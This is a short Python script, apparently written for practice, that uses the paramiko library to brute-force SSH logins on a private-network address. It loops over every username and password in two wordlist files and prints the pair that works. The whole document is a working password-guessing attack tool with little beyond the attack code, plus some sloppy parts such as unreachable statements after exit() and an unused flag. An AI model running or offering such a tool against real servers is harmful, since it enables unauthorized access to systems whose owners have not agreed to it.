# -*- coding:utf-8 -*-
# @Time :  19:23
# @Author : yangguoping
# @File : .py
# @software :
import paramiko
login=False
def tennet_ssh(target):
    client=paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    with open(f"username.txt",'r',encoding='utf-8') as f1:
        while True:
            user_name=f1.readline().strip()
            if user_name=="":
                break
            with open(f"password.txt",'r',encoding='utf-8') as f2:
                while True:
                    passwd=f2.readline().strip()
                    if passwd=="":
                        break
                    try:
                        login = True
                        client.connect(target,22,user_name,passwd,timeout=1)
                        print(f"登录成功 用户名{user_name},密码{passwd}")

                        exit()
                        client.close()

                    except:
                        print(f" texting用户名:{user_name}密码:{passwd} 失败！")
                        client.close()

        login=True
        exit()
def main():
    tennet_ssh('192.168.1.146')
if __name__ == '__main__':
    main()